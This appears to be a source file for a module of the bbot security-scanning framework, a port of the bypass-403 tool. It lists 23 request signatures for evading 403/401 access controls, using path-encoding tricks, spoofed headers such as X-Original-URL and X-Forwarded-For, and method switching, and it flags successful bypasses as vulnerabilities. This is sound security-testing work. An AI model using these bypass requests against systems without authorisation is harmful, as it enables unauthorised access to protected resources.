from bbot.modules.base import BaseModule
from bbot.core.errors import HttpCompareError

"""
Port of https://github.com/iamj0ker/bypass-403/
"""

# ([int]id,[string]method,[string]path,[dictionary]header,[bool]strip trailing slash)
signatures = [
    (1, "GET", "{scheme}://{netloc}/%2e/{path}", None, False),
    (2, "GET", "{scheme}://{netloc}/{path}/.", None, True),
    (3, "GET", "{scheme}://{netloc}//{path}//", None, True),
    (4, "GET", "{scheme}://{netloc}/./{path}/./", None, True),
    (5, "GET", "{scheme}://{netloc}/{path}", {"X-Original-URL": "{path}"}, False),
    (6, "GET", "{scheme}://{netloc}/{path}", {"X-Custom-IP-Authorization": "127.0.0.1"}, False),
    (7, "GET", "{scheme}://{netloc}/{path}", {"X-Forwarded-For": "http://127.0.0.1"}, False),
    (8, "GET", "{scheme}://{netloc}/{path}", {"X-Forwarded-For": "127.0.0.1"}, False),
    (9, "GET", "{scheme}://{netloc}/{path}", {"X-rewrite-url": "nonsense"}, False),
    (10, "GET", "{scheme}://{netloc}/{path}%20", None, True),
    (11, "GET", "{scheme}://{netloc}/{path}%09", None, True),
    (12, "GET", "{scheme}://{netloc}/{path}?", None, True),
    (13, "GET", "{scheme}://{netloc}/{path}.html", None, False),
    (14, "GET", "{scheme}://{netloc}/{path}/?anything", None, True),
    (15, "GET", "{scheme}://{netloc}/{path}#", None, False),
    (16, "POST", "{scheme}://{netloc}/{path}", {"Content-Length": "0"}, False),
    (17, "GET", "{scheme}://{netloc}/{path}/*", None, True),
    (18, "GET", "{scheme}://{netloc}/{path}.php", None, False),
    (19, "GET", "{scheme}://{netloc}/{path}.json", None, False),
    (20, "GET", "{scheme}://{netloc}/{path}", {"X-Host": "127.0.0.1"}, False),
    (21, "GET", "{scheme}://{netloc}/{path}..;/", None, False),
    (22, "GET", "{scheme}://{netloc}/{path};/", None, False),
    (23, "TRACE", "{scheme}://{netloc}/{path}/", None, True),
]


class bypass403(BaseModule):

    watched_events = ["URL"]
    produced_events = ["VULNERABILITY"]
    flags = ["active"]
    in_scope_only = True

    def handle_event(self, event):

        try:
            compare_helper = self.helpers.http_compare(event.data, allow_redirects=True)
        except HttpCompareError as e:
            self.debug(e)
            return

        for sig in signatures:

            sig = self.format_signature(sig, event)
            if sig[3] != None:
                headers = sig[3]
            else:
                headers = None
            match, reason, reflection, subject_response = compare_helper.compare(
                sig[2], headers=headers, method=sig[1], allow_redirects=True
            )

            if match == False:
                if str(subject_response.status_code)[0] != "4":
                    self.emit_event(
                        f"403 Bypass [{event.data}] Reason: [{reason}] Sig: [{str(sig[0])}]",
                        "VULNERABILITY",
                        source=event,
                        tags=["medium"],
                    )
                else:
                    self.debug(f"Status code changed to {str(subject_response.status_code)}, ignoring")

    def filter_event(self, event):
        if ("status-403" in event.tags) or ("status-401" in event.tags):
            return True
        return False

    def format_signature(self, sig, event):
        if sig[4] == True:
            cleaned_path = event.parsed.path.strip("/")
        else:
            cleaned_path = event.parsed.path.lstrip("/")
        kwargs = {"scheme": event.parsed.scheme, "netloc": event.parsed.netloc, "path": cleaned_path}
        formatted_url = sig[2].format(**kwargs)
        if sig[3] != None:
            formatted_headers = {k: v.format(**kwargs) for k, v in sig[3].items()}
        else:
            formatted_headers = None
        return (sig[0], sig[1], formatted_url, formatted_headers)
